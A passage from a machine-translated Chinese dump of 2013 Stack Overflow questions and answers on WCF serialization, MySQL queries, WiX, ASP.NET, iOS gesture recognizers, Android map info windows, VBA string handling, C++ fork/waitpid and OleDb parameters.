这里的缺点是您的所有客户端要么必须是 .NET 应用程序，要么您必须为您希望支持的每个平台提供不同的数据库。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:00:46.677

据我所知，可以在 WCF 服务中返回的唯一内容是基元或具有公共属性的类，这些公共属性对它们具有 get 方法。从较高级别来看，WCF 存在允许您指定客户端和服务器之间的合同，该合同在理论上与传输无关（即，您可以将 HTTP 端点换成 netTcp 端点，并且服务将以合同级别的相同方式运行）。

那么要回答的问题是您试图在此服务调用中传回哪些数据。如果它是一个名为 simple 的对象，具有 Message 和 Hidden 的数据点，那么我建议创建一个名为 Simple 的数据类，将这些值作为属性：

```
[DataContract]
public class Simple
{
    [DataMember]
    public string Hidden { get; set; }

    [DataMember]
    public string Message { get; set; }
} 
```

当客户端收到响应时，Message 和 Hidden 将填充您在服务器端设置的任何值。

DataMember属性[只能](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.datamemberattribute.aspx)用于属性和字段。这意味着 WCF 响应只能序列化这些类型。

如果您真的只想在 WCF 合同中使用 const 您可以将其转换为字段并将 DataMember 属性放在其上：

```
public class Simple
{
    [DataMember]
    public string Message { get; set; }

    [DataMember]
    public const string Hidden = "Underpants";
} 
```

为了能够做到这一点，该字段必须是可访问的（公共的）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T18:03:21.987

将[DataMember 属性](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.datamemberattribute.aspx)添加到您的属性。为此，您必须同时定义 a`get`和 a `set`。

```
[DataMember]
public string Hidden
{
    get { return _Hidden; }
    set { }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-03-14T18:43:03.117

从技术上讲你可以做

```
public class thingToSerialize{
    public Func<ArgType1,ArgType2...,ReturnType> myFunction{get;set;}
} 
```

然后为其分配一个 lambda，该 lambda 接受参数并在序列化之前返回返回类型

# mysql - MySQL - 使用其他字段选择 DISTINCT 字段

> ID：16110397
> 
> 赞同：1
> 
> 时间：2013-04-19T17:35:09.030
> 
> 标签：mysql, distinct

我有一张桌子。。

```
字段_1 | 字段_2 | 字段_3 | 字段_4
数据_1 | 数据_2 | 数据_3 | 数据_4
```

所有带有 tablename 的数据都可能重复。

我想选择唯一的 field_1，这样我就不会得到任何重复，但我还需要该行数据的其余部分。

```
SELECT DISTINCT field_1, field_2, field_3, field_4 FROM tablename; 
```

上面的查询显然不起作用。所以我的问题是我该怎么做？

**更新**

如何防止显示重复项。

所以如果我有

```
数据_1|数据_2|数据_3|数据_4
数据_1|数据_2|数据_3|数据_4
数据_6|数据_7|数据_8|数据_9
```

结果只会显示

```
数据_6|数据_7|数据_8|数据_9
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:38:47.567

能多给点记录吗？下面的查询将为`field_1`每个组生成唯一但随机的记录（*尤其是在处理大型数据库时*）。

```
SELECT field_1, field_2, field_3, field_4
FROM   TableName
GROUP  BY field_1 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/1717e/1)

**更新 1**

```
SELECT  field_1, field_2, field_3, field_4
FROM    TableName
GROUP   BY field_1, field_2, field_3, field_4
HAVING  COUNT(*) = 1 
```

# mysql - 在 MySQL 上加入 3 个表来汇总产品的销售额和库存

> ID：16110398
> 
> 赞同：0
> 
> 时间：2013-04-19T17:35:10.733
> 
> 标签：mysql, sql, join

我有 3 张桌子：

1.  产品（sku、价格、priceOffer 等）
2.  库存（sku、分支、项目）
3.  sales_provider（sku、项目、日期）

表 products 包含有关产品的所有信息，除了库存或销售。当前库存存储在表 stock 中，并包含有关每个分支上可用的项目数量的信息。表“sales_provider”存储了每种产品每天售出的商品数量。产品 ID 为“sku”。

现在，我试图通过一个查询获得以下产品：

1.  已产生最佳利润（销售数量 * 报价）
2.  仍有现货

而且，当然，我想知道有多少物品仍在库存中，有多少物品已售出。

我正在尝试这样的查询：

```
select
    *
from
    (
        select
            p.*,
            sum(s.items) stock,
            sum(sp.items) sales,
            case when
                p.priceOffer < p.price
                and
                p.priceOffer > 0
            then
                p.priceOffer
            else
                p.price
            end finalPrice
        from
            products p
        join
            stock s
            on
            s.sku = p.sku
        join
            sales_provider sp
            on
            sp.sku = p.sku
        group by
            sku
    ) temp
where
    stock > 0
order by
    (finalPrice * sales) desc
limit 1; 
```

但我有问题。基本上，我得到了大量的库存物品和 sales_provider 物品，而不是实际数量。此外，这是一个缓慢的查询（仅 9,500 个产品大约需要半秒）。

我一直在尝试修改它，我怀疑子查询是否必要，但我无法确定它。

如果有人可以帮助我改进它并获得正确的结果，我将非常感激。

提前感谢您提供任何有用的评论。

弗朗西斯科

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:48:02.457

对于这种类型的查询，您希望分别对`stock`和进行聚合`sales_provider`。否则，您将在给定项目的两个表之间生成笛卡尔积。

尝试这个：

```
select p.sku, (salesitems*offeredprice) as profit, stockitems, salesitems
from products p left join
     (select sku, SUM(items) as stockitems
      from stock
      group by sku
     ) s
     on p.sku = s.sku left join
     (select sku, SUM(items) as salesitems
      from sales_provider sp
      group by sku
     ) sp
     on p.sku = sp.sku
where p.stockitems > 0
order by profit desc 
```

这假设它`product(sku)`是唯一的。

# wix - 在 WIX UI 中集成外部 exe

> ID：16110402
> 
> 赞同：1
> 
> 时间：2013-04-19T17:35:26.337
> 
> 标签：wix

对于我们的产品，要开发安装程序，我们使用的是 WIX 3.6。

在安装顺序中，作为requiremet的一部分，我们需要配置一些更改。我们在winforms（（treeview）中实现了separatley，并在安装顺序中引用了该exe。exe正在完美打开，但在单独的窗口中打开。我们想打开在 WIX UI 本身中不作为一个单独的窗口。

请提供输入以实现这一目标。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:02:23.277

无法从安装内部启动可执行文件并与包显示的 UI 集成。相反，您可以启动一个可执行文件并将其注册为[External UI Handler](http://msdn.microsoft.com/en-us/library/windows/desktop/aa370053%28v=vs.85%29.aspx)。从那里您可以将包 UI 设置为外部可执行文件的 UI。

# c# - Silverlight 上的 HttpClient 与通用 GET/POST 方法？

> ID：16110406
> 
> 赞同：1
> 
> 时间：2013-04-19T17:35:45.553
> 
> 标签：c#, silverlight, rest, dotnet-httpclient

我将使用 Silverlight 客户端的一些 REST 服务。

我看到[HTTP 客户端](http://nuget.org/packages/Microsoft.Net.Http)很好地使用了 TPL，但我不喜欢结果类型只是 HttpResponseMessage

```
public Task<HttpResponseMessage> GetAsync(string requestUri)
public Task<HttpResponseMessage> PostAsync(string requestUri, HttpContent content) 
```

我想要的是

```
public Task<T> GetAsync<T>(string requestUri)
public Task<T> PostAsync<T>(string requestUri, object request) 
```

允许请求和响应的自动序列化/反序列化。从头开始编写这种包装器似乎并不难，但我最好使用现有的实现，如果有的话。

有什么办法吗？如果不是，那么这种方法可能有问题？

# windows-phone-7 - 如何更改 SwitchButton 按钮的颜色

> ID：16110410
> 
> 赞同：1
> 
> 时间：2013-04-19T17:35:54.453
> 
> 标签：windows-phone-7, xaml

我在哪里可以设置 SwitchButton 按钮的颜色？默认情况下，它是白色的，所以在白色背景上看起来很奇怪。我将所有可能的画笔设置为明显的颜色（蓝色），但按钮仍然是白色的。

![在此处输入图像描述](https://i.stack.imgur.com/s1I7E.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:51:36.127

理想情况下，您可能只想编辑（或复制）原始控件模板。右键单击它，编辑模板-> 编辑，您可以在模板中公开制作背景的对象以及不同状态的对象，如 MouseOver、IsChecked 等，并允许您直接对给出的对象执行此操作当前背景。如果他们没有`Background`绑定到模板的属性，您通常必须这样做，您可以使用 Background="blah" 指定

这是我假设的情况，因为您设置了背景属性，但它仍然没有显示您的更改。

您还可以在模板中公开该属性，因此从现在开始，您可以通过查找哪个对象是那个白色背景并将其背景属性更改为来指定 Background=""；

`Background="{TemplateBinding Background}"`

希望这可以帮助。

# dojo - Dojo 1.8 构建层模块在解析期间不可用

> ID：16110411
> 
> 赞同：1
> 
> 时间：2013-04-19T17:35:55.743
> 
> 标签：dojo

在我们的项目中，我们使用 parse on declarative syntax 来实例化我们的模块。我们有一个构建过程，可以为我们构建我们的道场、通用和功能层。在我们的一个函数中，解析器抱怨一些模块没有定义（奇怪的是这些模块也不是自动需要的）。我已确认该层包含在页面中，并且模块包含在该层中。我可以在解析后“要求”这些模块，它们会返回正确的构造函数。没有报告错误（检索模块的尝试在 try/catch 中）。

我觉得发生了一些愚蠢的事情，但我找不到。有关如何进行故障排除的任何建议都会有所帮助。

我已经尝试了 parseOnLoad （我们的默认值）和单独调用 parse ，即使在 10 秒超时之后也是如此。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T13:10:17.930

呃，我知道这很愚蠢。我们有 lang="en" 而不是 lang="en-US"。

# vb.net - Vb.Net win表单应用程序未在所有计算机上运行

> ID：16110416
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:36:01.947
> 
> 标签：vb.net, winforms, deployment, installation

我在 VB 中编写了一个需要一些外部 DLL 的 win forms 应用程序，它可以在多台机器上完美安装和运行，但它不能在一台笔记本电脑上运行！我什至让 Filestreams 将异常写入文本文件。虽然它将预期的标题文本写入其他计算机上的调试文件，但它不会向上述笔记本电脑上的调试文件写入任何内容。我的猜测是它甚至没有达到 Form1_Load() 方法。

这是程序的结构：

```
Import namespaces from external programs

Public Class MyApp

''Varibale declarations:

Structures and classes based on DLLs
Other declarations based on .Net Objects
Stream writer declaration and initialization for the debug file

Private Sub Form1_Load(...)

Try
    Write Start and time to the debug file

    execute commands
catch
    write debug info
end Try

End Sub

Other events and subs

End Class 
```

有没有办法查看调试文件的初始化和 Form1_Load() 的执行之间发生了什么？

正如我所说，它在所有使用它的机器上都能完美运行，除了一台！我需要在那台机器上检查什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T14:04:40.413

您是否尝试在初始化后立即在调试文件中添加一个占位符行，以检查该文件实际上是否可写？

表单的构造函数是否可达？如果将“将开始和时间写入调试文件”代码移动到构造函数，它会写什么吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:46:12.087

很可能笔记本电脑的用户不在管理员组中，而您正在尝试写入应用程序文件夹。

# c# - ASPX 表单在提交时未调用代码隐藏

> ID：16110420
> 
> 赞同：1
> 
> 时间：2013-04-19T17:36:12.790
> 
> 标签：c#, asp.net, html

我面临着一种我无法解释的奇怪行为。我的 ASP.net 页面之一上有以下表格：

```
<%@ Control Language="C#" AutoEventWireup="true" CodeBehind="Codebehind.aspx.cs" Inherits="Myclass.Test" %>
<form name="application" id="application" method="post">
<asp:Table runat="server" width="840" border="0" align="center" cellspacing="0" cellpadding="0" id="tbl_test">
...
<asp:TableRow>
<asp:TableCell ColumnSpan="2" HorizontalAlign="Center" style="padding-top:10px">
<asp:Button onClick="Click" ID="btn" runat="server" Text="Submit!" Height="30" Width="150" />
</asp:TableCell>
</asp:TableRow>
</asp:Table> 
```

在 aspx.cs 程序集中，我有一个受保护的函数“Click”，一旦用户单击表单中的按钮，它就会被触发。但是，事实并非如此。什么都没有发生，我按下按钮，我的代码隐藏中的函数永远不会做它的事情。

我在这里想念什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T17:37:47.700

您需要`runat="server"`在表单上添加属性

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:06:48.240

您是否使用带有验证的表单？如果是，请使用

```
<asp:Button ID="btn" runat="server" onClick="Click" Text="Submit" CausesValidation="false" /> 
```

# ios - 将 NSDictionary 作为参数传递给 UITapGestureRecognizer

> ID：16110422
> 
> 赞同：4
> 
> 时间：2013-04-19T17:36:19.743
> 
> 标签：ios, objective-c, nsarray, uitapgesturerecognizer

我想将 a`NSArray`作为参数传递给`UITapGestureRecognizer`并在 downloadOptionPressed 方法中访问它。我怎样才能做到这一点 ？

这`NSArray`

```
NSArray *parameters = [NSArray arrayWithObjects:currentTrack, nil]; 
```

创建`UITapGestureRecognizer`

```
UITapGestureRecognizer *downloadOptionPressed = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(timeFrameLabelTapped:)];
    [downloadOption addGestureRecognizer:downloadOptionPressed]; 
```

`downloadOptionPressed`方法_

```
-(void)downloadOptionPressed:(UIGestureRecognizer*)recognizer{

} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-19T17:44:54.133

您是否有理由无法将信息存储在拥有的视图控制器中？是为了抽象吗？

您始终可以扩展 UITapGestureRecognizer 以携带更多数据：

```
@interface UserDataTapGestureRecognizer : UITapGestureRecognizer
@property (nonatomic, strong) id userData;
@end

@implementation UserDataTapGestureRecognizer
@end 
```

...

```
UserDataTapGestureRecognizer *downloadOptionPressed =
    [[UserDataTapGestureRecognizer alloc] initWithTarget:self
    action:@selector(timeFrameLabelTapped:)];
downloadOptionPressed.userData = parameters; 
```

...

```
- (void)downloadOptionPressed:(UserDataTapGestureRecognizer *)recognizer {
    NSArray *parameters = recognizer.userData;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-19T18:24:02.647

您可以使用**关联对象**将参数与点击手势实例一起传递。

你可以检查这个[objective-c-associated-objects](http://labs.vectorform.com/2011/07/objective-c-associated-objects/)

它会解决你的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-03-19T07:38:11.287

有时传递一个索引就足够了，在这种情况下，标签属性视图是你的盟友。在下面的示例中，我假装将长按添加到 tableview 单元格中。一旦事件被触发，我只想知道哪个单元格被长按：

```
 let longPress = UILongPressGestureRecognizer(target: self, action: "longPress:")
    cell.tag = indexPath.row
    cell.addGestureRecognizer(longPress) 
```

...

```
func longPress(guesture: UILongPressGestureRecognizer) {
    print("\(guesture.view!.tag)")} } 
```

# java - 推送数据时如何监听

> ID：16110428
> 
> 赞同：3
> 
> 时间：2013-04-19T17:36:36.603
> 
> 标签：java, atmosphere, portaljs

我正在使用`portal`javascript 库与我的 Java 套接字进行交互。我似乎无法确定如何将请求映射到以下资源上的方法。正在正确建立套接字`@Path("workstation/approval/{uuid}")`，然后通过连接传递 JSON 数据。但是在 Java 方面，**我如何将数据推送映射到方法以便我可以处理它？**

```
@Path("workstation/approval/{uuid}")
@Consumes({MediaType.APPLICATION_JSON})
@Produces({MediaType.APPLICATION_JSON})
public class WorkstationResource {

    ObjectMapper mapper = new ObjectMapper();

    @Context
    private BroadcasterFactory broadcasterFactory;

    @GET
    @Suspend
    public Broadcastable get(@PathParam("uuid") String uuid) {
        return new Broadcastable(getBroadcaster(uuid));
    }

    private Broadcaster getBroadcaster(String uuid) {
        return broadcasterFactory.lookup(JerseyBroadcaster.class, "workstation/approval/"+uuid, true);
    }

    public String onMessage(String message) throws IOException {
        return mapper.writeValueAsString("This is a test");
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:03:10.553

您使用的是 WebSocket 还是 Comet？在任何情况下，尝试添加一个 @Post 注释方法，这将起作用。如果您有更多问题，请访问 Atmosphere[邮件列表](https://groups.google.com/group/atmosphere-framework?pli=1)，或查看[项目示例](https://github.com/Atmosphere/atmosphere)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T22:16:26.733

其实它很简单！只需为每个方法添加另一个参数，例如，更改

```
public Broadcastable get(@PathParam("uuid") String uuid) {
    return new Broadcastable(getBroadcaster(uuid));
} 
```

至

```
public Broadcastable get(@PathParam("uuid") String uuid,String postData) {
    return new Broadcastable(getBroadcaster(uuid));
} 
```

您将通过 postData 参数中的连接传递数据

# android - Google Maps Android API v2 中忽略了我的自定义 InfoWindow 布局的宽度

> ID：16110429
> 
> 赞同：5
> 
> 时间：2013-04-19T17:36:42.760
> 
> 标签：android, google-maps-android-api-2

我在自定义 InfoWindow 布局中设置的宽度似乎被忽略了（它总是 match_parent）。

我错过了什么吗？

```
mMap.setInfoWindowAdapter(new InfoWindowAdapter() {

    @Override
    public View getInfoWindow(Marker arg0) {
        return null;
    }

    @Override
    public View getInfoContents(Marker arg0) {

        View v = getActivity().getLayoutInflater().inflate(R.layout.info_window_layout, null);

        // set my custom data

        return v;

    }
}); 
```

**info_window_layout.xml**

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="100dp"
    android:layout_height="50dp"
    android:padding="5dp" >

    <!-- some custom stuff -->

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-19T10:50:06.037

尝试在 getInfoWindow 中使用它，getInfoContents 返回 null：

```
<LinearLayout
            xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:background="@drawable/transparent">

        <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:gravity="center_horizontal"
                android:orientation="vertical">

            <!-- some custom stuff -->

        </LinearLayout>
    </LinearLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T19:43:42.583

我想它实际上是 wrap_content。

信息窗口的工作方式是将您的视图绘制为位图，而不是将其放在任何其他视图组中。layout_xxx 由父视图使用。

在您的 RelativeLayout 的部分或全部子项上硬编码这些值可能会解决您的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-12-23T16:46:36.993

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_gravity="center_horizontal"
android:background="#8BC34A"
android:orientation="vertical"
android:paddingBottom="@dimen/small_padding"
android:paddingLeft="@dimen/very_samll_padding"
android:paddingRight="@dimen/very_samll_padding"
android:paddingTop="@dimen/small_padding">

<LinearLayout
    android:layout_width="320dp"
    android:layout_height="wrap_content"
    android:orientation="vertical">

    <TextView
        android:id="@+id/tv_address"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:textColor="@color/white" />

    <LinearLayout
        android:id="@+id/ll_latlong"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@id/tv_address"
        android:layout_marginTop="@dimen/very_samll_padding"
        android:orientation="horizontal">

        <TextView
            android:id="@+id/tv_lat"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center_vertical"
            android:textColor="@color/white" />

        <View
            android:layout_width="1dp"
            android:layout_height="12dp"
            android:layout_gravity="center_vertical"
            android:layout_marginLeft="@dimen/small_padding"
            android:layout_marginRight="@dimen/small_padding"
            android:background="@color/white" />

        <TextView
            android:id="@+id/tv_long"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center_vertical"
            android:textColor="@color/white" />

    </LinearLayout>
</LinearLayout> 
```

只需根据您的要求更改宽度 dp

# excel - 来自Shell的图像尺寸字符串中的Replace（）问号

> ID：16110431
> 
> 赞同：7
> 
> 时间：2013-04-19T17:36:46.413
> 
> 标签：excel, vba, shell, windows-7

我试图通过在 VBA 中使用 Shell 对象来获取位图的高度。

这是代码的相关部分（`bmp`是自定义类的成员，并且`.Width`是定义为整数的属性。）

```
Set objImg = objShell.Namespace(subfs(sf)).ParseName(bmp.Name)
tmpDim = objShell.Namespace(subfs(sf)).GetDetailsOf(objImg, 162)
tmpDim = Replace(tmpDim, "?", "")
tmpDim = Replace(tmpDim, " pixels", "")
bmp.Width = CInt(tmpDim) 
```

我在最后一行收到类型不匹配错误，因为 tmpDim 的值为`?754`. 作为参考，第二行之后的 tmpDim 的值为`?754 pixels`.

我有一个`?`用空字符串替换的步骤，但它不起作用。我怎样才能摆脱问号字符？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-08-13T18:48:33.447

您看到的问号实际上不是问号。Asc() 函数将返回值 63，但 AscW() 可能会返回 8206，即 unicode 从左到右的标记。

我相信 VBA 使用两字节宽的字符存储字符串。Asc 函数将仅返回 0-255 的值，并且对于超出该范围的任何内容似乎返回 63。

这就是为什么你的`Replace(tmpDim, "?", "")`不起作用。您正在尝试等效于

```
Replace(tmpDim, Chr(63), "") 
```

你需要

```
Replace(tmpDim, ChrW(8206), "") 
```

（假设 ? 是从左到右的标记，在我的测试中是）

# c++ - 为什么这段代码会失败？孩子不等

> ID：16110432
> 
> 赞同：2
> 
> 时间：2013-04-19T17:36:50.463
> 
> 标签：c++, ubuntu, exec, parent-child, waitpid

好的，所以我一直在努力学习掌握子进程并正确等待它们完成。我已经阅读了很多 Stack Overflow Q/A，但我似乎仍然无法按照我的意愿让它工作。我一直在阅读/搜索这本书（C++ Primer plus 6th ed.）——我已经做了一些研究，但我仍然不能让它像我想要的那样等待。

因此，我在 Stack Overflow 上查看了几件事以供参考：[Checking the status of a child process in C++](https://stackoverflow.com/questions/5278582/checking-the-status-of-a-child-process-in-c)

这是我到目前为止所尝试的：

```
using namespace std;
int main() {
int status;
pid_t child;
child = fork();

if ( child > 0 ) {
    cout << "\nChild #1 is in charge\n";
    execlp("ls", "ls", NULL);
}

else if ( child < 0 ) {
    cout << "\nSomething wen't wrong in the forking process\n";
}

else {

}

child = fork();
if ( child > 0 ) {
    cout << "\nSecond child is in charge\n";
    execlp("locate", "locate", "etc", NULL);
}

else if ( child < 0 ) {
    cout << "\nSomething went wrong in the forking of second child!\n";
}

else {

} 
```

现在这将显示`Child #1 is in charge`，`Second child is in charge`然后它将混合两个命令（我`ls`在 locate 之间看到一些`etc`）。

我尝试过的第二件事：

```
using namespace std;
int main() {
int status;
pid_t child;
pid_t ch_status = waitpid(child, &status, WNOHANG);

child = fork();
if ( child > 0 ) {
    cout << "\nChild is in charge\n";
    execlp("ls", "ls", NULL);
}

else if ( child < 0 ) {
    cout << "\nSomething wen't wrong in the forking process\n";
}

if ( ch_status == 0 ) {

}

else if ( ch_status == -1 ) {
    cout << "\nERROR IN CHILD #1\n";
}

else {

}

child = fork();
if ( child == 0 ) {
    cout << "\nSecond child is in charge\n";
    execlp("locate", "locate", "etc", NULL);
}

else if ( child < 0 ) {
    cout << "\nSomething went wrong in the forking of second child!\n";
}

if ( ch_status == 0 ) {

}

else if ( ch_status == -1 ) {
    cout << "\nERROR IN CHILD #1\n";
}

else {

}

child = fork();
if ( child > 0 ) {
    cout << "\nThird child is in charge!\n";
    execlp("echo", "echo", "herro", NULL);
}

else if ( child < 0 ) {
    cout << "\nForking of third child failed!\n";
}

if ( ch_status == 0 ) {

}

else if ( ch_status == -1 ) {
    cout << "\nERROR IN CHILD #2\n";
}

else {

}

return 0;
} 
```

这更多地基于我提供的链接，它产生了与我第一次测试运行相同的结果，除了它还会显示`ERROR IN CHILD #1/2`.

这些命令是无关紧要的，我只是想不明白我在这里做错了什么......我也尝试过将它们嵌套在 中`else { //start second fork here }`，但我也无济于事。

根据我阅读`waitpid(2)`我应该使用的手册后的理解`WNOHANG`； [http://linux.die.net/man/2/waitpid](http://linux.die.net/man/2/waitpid)

非常感谢任何建议/指针。

如果可能，请提交您将如何完成正确结果的示例代码`(execute command 1 -> wait until done -> execute command 2 -> exit)`。

期待回复。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:50:57.977

你应该在你分叉*后*`waitpid()`打电话给父母。也就是说，它应该进入分支。*`child > 0`*

 *该函数的目的是“等待子状态的变化”。但是，您在生成孩子之前调用它。

代码应如下所示：

```
using namespace std;
int main() {

int status;
pid_t child;

child = fork();
if ( child == 0 ) {
    cout << "\nChild is in charge" << endl;
    execlp("ls", "ls", NULL);
} else if ( child < 0 ) {
    cout << "\nSomething wen't wrong in the forking process" << endl;
} else {
    cout << "Parent waiting" << endl;
    pid_t ch_status = waitpid(child, &status, WNOHANG);
    if (ch_status == -1) {
      cout << "\nERROR IN CHILD #1" << endl;
    }
}

child = fork();
//same procedure as above

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:39:45.710

您错误地判断输出语句的*执行*顺序是基于它们的输出被*刷新*的顺序。虽然在执行相应的语句之前无法刷新输出，但您的代码中没有刷新调用。所以冲洗可能会*在很久*以后发生。

使用`endl`而不是将 a`\n`放在行尾。操纵器`endl`包括冲水器。*

# c# - 没有为 OleDBDataAdapter 的一个或多个必需参数指定值

> ID：16110435
> 
> 赞同：0
> 
> 时间：2013-04-19T17:37:22.900
> 
> 标签：c#, sql, oledb, dataadapter, oledbdataadapter

嘿，我意识到这个问题之前已经被问过，但即使我按照答案，我似乎仍然无法让我的代码工作。错误发生在“data_adapter.Fill(temp_table)” 任何有关正在发生的事情的帮助将不胜感激。

```
string ConnStr = "Provider = Microsoft.Jet.OLEDB.4.0; Data Source = H:\\School Work\\Computing A Level\\Stock checker\\Program\\Morgan's Motors Database.mdb";

string Query = "SELECT * FROM [Car Info] WHERE @x ";
string FirstQuery = null;

int i = 0;

for (i = 0; i < ColumnName.Count - 1; i++)
{
    FirstQuery += string.Format("{0} = {1} AND ", ColumnName[i], EnteredFields[i]);
}

FirstQuery += string.Format("{0} = {1}", ColumnName[i], EnteredFields[i]);

MessageBox.Show(Query);

OleDbConnection database_connection = new OleDbConnection(ConnStr);

OleDbCommand database_command = new OleDbCommand(Query, database_connection);
database_command.Parameters.AddWithValue("@x", FirstQuery);

OleDbDataAdapter database_adapter = new OleDbDataAdapter();
database_adapter.SelectCommand = new OleDbCommand(database_command.CommandText, database_connection);

DataTable temp_table = new DataTable();

database_adapter.Fill(temp_table);

BindingSource data_source = new BindingSource();

data_source.DataSource = temp_table;

dataGridView1.DataSource = data_source; 
```

编辑：我在重构代码方面取得了一些进展，现在的问题是“？” 没有被替换

string ConnStr = "Provider = Microsoft.ACE.OLEDB.12.0; 数据源 = H:\School Work\Computing A Level\Stock checker\Program\Morgan's Motors Database.mdb;";

```
 OleDbConnection conn_database = new OleDbConnection();
            conn_database.ConnectionString = ConnStr;

            OleDbCommand comm_database = new OleDbCommand();
            comm_database.CommandText = "SELECT * FROM [Car Info] WHERE ? = ?";
            comm_database.Connection = conn_database;

            OleDbDataAdapter adap_database = new OleDbDataAdapter(comm_database);

            DataTable data_database = new DataTable();

            for (int i = 0; i < ColumnName.Count; i++)
            {
                comm_database.Parameters.AddWithValue("?", ColumnName[i].ToString());
                comm_database.Parameters.AddWithValue("?", EnteredFields[i].ToString());

                MessageBox.Show(adap_database.SelectCommand.CommandText);

                adap_database.Fill(data_database);
            }

            BindingSource bind_database = new BindingSource();
            bind_database.DataSource = data_database;

            dataGridView1.DataSource = bind_database; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:48:42.963

你试过了吗 ：

```
database_command.Parameters.AddWithValue("@x", EnteredFields[i]); 
```

代替 ：

```
database_command.Parameters.AddWithValue("@x", FirstQuery); 
```

通常在使用参数时，您只需添加参数名称及其值，而不必将 columnName = 添加到值中。说得通？

如果想利用参数，您可以尝试的一件事是下面的代码。我不知道它是否能解决您的问题，但至少它有助于保护您免受 SQL 注入攻击。请让我知道，如果你有任何问题。

```
string Query = "SELECT * FROM [Car Info] WHERE {0} ";

for (i = 0; i < ColumnName.Count - 1; i++)
{
    FirstQuery += string.Format("{0} = @{1} AND ", ColumnName[i], ColumnName[i]);
}
FirstQuery += string.Format("{0} = @{1}", ColumnName[i], ColumnName[i]);
Query = String.Format(Query, FirstQuery);

for (i = 0; i < ColumnName.Count - 1; i++)
{
    database_command.Parameters.AddWithValue("@" + ColumnName[i], EnteredFields[i]);
} 
```

# ios - 使用 Facebook 应用程序分享

> ID：16110436
> 
> 赞同：0
> 
> 时间：2013-04-19T17:37:24.553
> 
> 标签：ios, facebook

现在我正在使用[Facebook SDK](https://developers.facebook.com/ios/)来分享我的应用程序中的帖子。问题是这个sdk在我的应用程序中弹出一个webview并要求用户登录。必须有更好的方法。

我可以将共享信息发送到用户设备上的 facebook 应用程序（如果他们安装了它）吗？或者至少利用 facebook 应用程序来检查凭据？如果人们必须登录才能分享，他们可能不会这样做..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:55:35.723

The latest [Facebook SDK 3.5](https://developers.facebook.com/ios/features/whats-new-ios-sdk-3.5/) includes a native share dialog. If you follow the authentication workflow according do the [documentation](https://developers.facebook.com/docs/tutorials/ios-sdk-tutorial/authenticate/) and the phone is on iOS 6.0 you should not get a UIWebView during authentication, instead you will get a UIAlertView.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:49:10.583

Facebook 登录过程仅在少数情况下会使用 WebView。其中一些是：
1）您明确要求它这样做`- (void)openWithBehavior:(FBSessionLoginBehavior)behavior completionHandler:(FBSessionStateHandler)handler;`，我认为这不是您的情况。
2) 如果设备上没有安装 Facebook 应用，则 FB SDK 回退到使用 WebView 登录窗口。
3）可能，这就是你的情况。如果您在第一次尝试打开 FB 会话时请求发布权限，则 FB SDK 也将回退到包含 WebView 的旧登录流程。在新的登录流程中，FB 会话应该首先以读取权限打开（在这种情况下，FB 将使用快速应用切换或原生 iOS FB 登录）：
`+ (BOOL)openActiveSessionWithReadPermissions:(NSArray*)readPermissions allowLoginUI:(BOOL)allowLoginUI completionHandler:(FBSessionStateHandler)handler;`
然后，您应该向用户请求额外的发布权限：
`- (void)requestNewPublishPermissions:(NSArray*)writePermissions defaultAudience:(FBSessionDefaultAudience)defaultAudience completionHandler:(FBSessionRequestPermissionResultHandler)handler;`
这样，用户将不需要登录（如果他已经登录了 FB 应用程序），但是从您的应用程序到 FB 的双重切换会带来不便（尽管它最近运行得相当快）。

我一直在寻找一种更简洁的方法来在第一次通话时使用 FB Single Sign On 获得发布权限，但不幸的是还没有发现任何工作。

# c - 访问结构体数组元素

> ID：16110438
> 
> 赞同：5
> 
> 时间：2013-04-19T17:37:37.973
> 
> 标签：c, arrays, struct

